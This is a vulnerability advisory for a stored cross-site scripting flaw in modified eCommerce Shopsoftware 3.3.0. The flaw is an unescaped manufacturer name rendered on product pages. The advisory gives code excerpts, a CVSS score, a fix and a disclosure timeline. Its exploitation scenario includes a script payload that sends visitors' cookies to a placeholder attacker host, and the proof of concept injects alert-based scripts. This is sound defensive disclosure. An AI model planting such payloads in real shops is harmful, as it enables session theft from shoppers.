# Stored Cross-Site Scripting in modified eCommerce Shopsoftware

## Vulnerability Information

| Field              | Details                         |
| ------------------ | ------------------------------- |
| Advisory ID        | VULN-2026-001                   |
| CVE ID             | Pending assignment              |
| Vendor             | modified-shop                   |
| Product            | modified eCommerce Shopsoftware |
| Tested Version     | 3.3.0 (rev. 16825)              |
| Vulnerability Type | Stored Cross-Site Scripting     |
| CWE                | CWE-79                          |
| Severity           | Medium (Provisional)            |
| CVSS v3.1          | 4.8                             |
| Discovery Date     | 2026-11-18                      |
| Publication Date   | Pending                         |
| Patch Status       | No fix documented               |
| Disclosure Status  | Pending                         |

---

## 1. Executive Summary

A stored cross-site scripting (Stored XSS) vulnerability was identified in modified eCommerce Shopsoftware v3.3.0 due to improper output encoding of the `manufacturers_name` field on product detail pages.

The vulnerability originates in `includes/modules/product_info.php` (lines 71–72), where the value of `$manufacturer['manufacturers_name']` is assigned to the Smarty template variables `{$MANUFACTURER}` and `{$MANUFACTURER_NAME}` without appropriate HTML encoding through `htmlspecialchars()`.

All three bundled product detail templates (`product_info_v1_tabs.html`, `product_info_v2_accordion.html`, and `product_info_v3_plain.html`) render the `{$MANUFACTURER}` variable without applying Smarty's `|escape` modifier.

As a result, an authenticated user with permission to modify manufacturer records could inject arbitrary JavaScript that is subsequently executed in the browser of visitors accessing product pages associated with the affected manufacturer.

The following code excerpts illustrate the improper handling of the affected field:

```php
// product_info.php:71-72 — manufacturers_name assigned without htmlspecialchars():
$info_smarty->assign('MANUFACTURER', $manufacturer['manufacturers_name']);
$info_smarty->assign('MANUFACTURER_NAME', $manufacturer['manufacturers_name']);
```

```smarty
{* product_info_v1_tabs.html:22 / v2_accordion.html:22 / v3_plain.html:22 — no |escape: *}
<span itemprop="name">{$MANUFACTURER}</span>
```

Any visitor who opens a product page whose manufacturer has a malicious `manufacturers_name` will trigger XSS. Product detail pages are the most visited pages in any eCommerce store.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: includes/modules/product_info.php:71-72 | rev 16825 | None | Affected |
| Component: templates/*/module/product_info/product_info_v1_tabs.html:22 | rev 16825 | None | Affected |
| Component: templates/*/module/product_info/product_info_v2_accordion.html:22 | rev 16825 | None | Affected |
| Component: templates/*/module/product_info/product_info_v3_plain.html:22 | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker), Smarty 3

---

## 3. Vulnerability Description

### Storage (`admin/manufacturers.php`)

```php
// admin/manufacturers.php — manufacturers_name stored without HTML encoding:
'manufacturers_name' => xtc_db_prepare_input($_POST['manufacturers_name']),
// xtc_db_prepare_input = trim() + stripslashes() only — no htmlspecialchars()
```

### Assignment (`product_info.php:71-73`)

```php
// product_info.php:71 — MANUFACTURER assigned without htmlspecialchars():
$info_smarty->assign('MANUFACTURER', $manufacturer['manufacturers_name']);

// product_info.php:72 — MANUFACTURER_NAME assigned without htmlspecialchars():
$info_smarty->assign('MANUFACTURER_NAME', $manufacturer['manufacturers_name']);

// product_info.php:73 — MANUFACTURER_TITLE (manufacturers_title) also without htmlspecialchars():
$info_smarty->assign('MANUFACTURER_TITLE', $manufacturer['manufacturers_title']);
```

### Rendering — All Product Info Templates

```smarty
{* product_info_v1_tabs.html:17-22 / v2_accordion.html:17-22 / v3_plain.html:17-22 — no |escape: *}
{if isset($MANUFACTURER) && $MANUFACTURER != ''}
  <div class="pd_heading_inforow">
    <strong>{#products_manufacturer#}</strong>
    <span itemprop="name">{$MANUFACTURER}</span>
  </div>
{/if}
```

### Necessary Conditions

- **Authentication:** Admin (to inject `manufacturers_name`) + Public visitor (to trigger)
- **User interaction:** Required — visitor must open any product page associated with the malicious manufacturer
- **Attack vector:** Network

---

## 4. Impact

**Public path (CVSS 4.8):**
- Confidentiality: Low — visitor session tokens, page content
- Integrity: Low — DOM manipulation in the manufacturer name field on product detail pages
- Scope: Changed — visitor browser session affected
- Note: Product detail pages are the most visited pages in any eCommerce store. Any visitor who views any product associated with the malicious manufacturer triggers XSS. All three bundled product_info templates are affected.

---

## 5. Classification

### CVSS (admin injection, public visitor trigger)

- **Score:** 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High (admin to inject) |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE / CAPEC

- CWE-79 / CAPEC-198: Stored XSS

---

## 6. Exploitation Scenario

1. Admin navigates to Admin → Products → Manufacturers → edit a manufacturer.
2. Admin sets the **Name** field to `<script>fetch('https://attacker.com/?c='+document.cookie)</script>`.
3. Any visitor who opens any product page associated with that manufacturer triggers the script.
4. `product_info.php:71` assigns the unescaped name to Smarty `{$MANUFACTURER}`.
5. `product_info_v*.html:22` renders `<span itemprop="name">{$MANUFACTURER}</span>` → executes the script.

---

## 7. Technical Evidence

### Affected Components

```text
Admin:   admin/manufacturers.php — manufacturers_name stored via xtc_db_prepare_input (no htmlspecialchars)
Public:  includes/modules/product_info.php:71
           assign('MANUFACTURER', $manufacturer['manufacturers_name']) (no htmlspecialchars)
         includes/modules/product_info.php:72
           assign('MANUFACTURER_NAME', $manufacturer['manufacturers_name']) (no htmlspecialchars)
         templates/*/module/product_info/product_info_v1_tabs.html:22
         templates/*/module/product_info/product_info_v2_accordion.html:22
         templates/*/module/product_info/product_info_v3_plain.html:22
           {$MANUFACTURER} without |escape (rendered in <span itemprop="name">)
Database table: manufacturers (column: manufacturers_name)
Parameter(s): manufacturers_name (POST — admin/manufacturers.php)
Authentication: Admin to inject; Public visitor to trigger (via product detail page)
```

### Example Inject

```bash
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE manufacturers SET manufacturers_name='<script>alert(document.cookie)</script>'
      WHERE manufacturers_id=1;" 2>/dev/null
```

### Expected HTML Output (product detail page)

```html
<div class="pd_heading_inforow">
  <strong>Manufacturer:</strong>
  <span itemprop="name"><script>alert(document.cookie)</script></span>
</div>
```

---

## 8. Proof of Concept

```bash
#!/bin/bash
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "UPDATE manufacturers
      SET manufacturers_name='<script>alert(\"V65_manufacturer_product_info\")</script>'
      WHERE manufacturers_id=1;" 2>/dev/null

echo "[*] Visitor opens any product page of manufacturer_id=1 to trigger XSS."
```

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Products → Manufacturers → edit a manufacturer.
3. In the **Name** field, enter `<script>alert(1)</script>`. Save.
4. As a visitor (or in a fresh browser), navigate to any product page belonging to that manufacturer.
5. `alert(1)` fires from the `<span itemprop="name">` element.

---

## 10. Fix

```php
// product_info.php:71-72 — fix:
$info_smarty->assign('MANUFACTURER', htmlspecialchars($manufacturer['manufacturers_name'], ENT_QUOTES, 'UTF-8'));
$info_smarty->assign('MANUFACTURER_NAME', htmlspecialchars($manufacturer['manufacturers_name'], ENT_QUOTES, 'UTF-8'));
```

Alternatively, use `|escape` in all product info templates:
```smarty
{* product_info_v*.html:22 — fix: *}
<span itemprop="name">{$MANUFACTURER|escape}</span>
```

---

## 11. Disclosure Timeline

| Date | Event |
|---|---|
| 18/11/2026 | Identified via code review |
| 18/11/2026 | Advisory prepared |
| pending | Vendor notified |

---

## 12. Credits

- **Researcher:** Van Alyson Dutra (@4rch30n), Marcus de Almeida (@maarckz) & Daniel Costa (@bscosta91)
- **Contact:** van.vep@gmail.com

---

## 13. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html

---

## 14. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 15. Contact

- **Email:** van.vep@gmail.com
- **Repository:** https://github.com/4RCH30N/Vuln-Research/
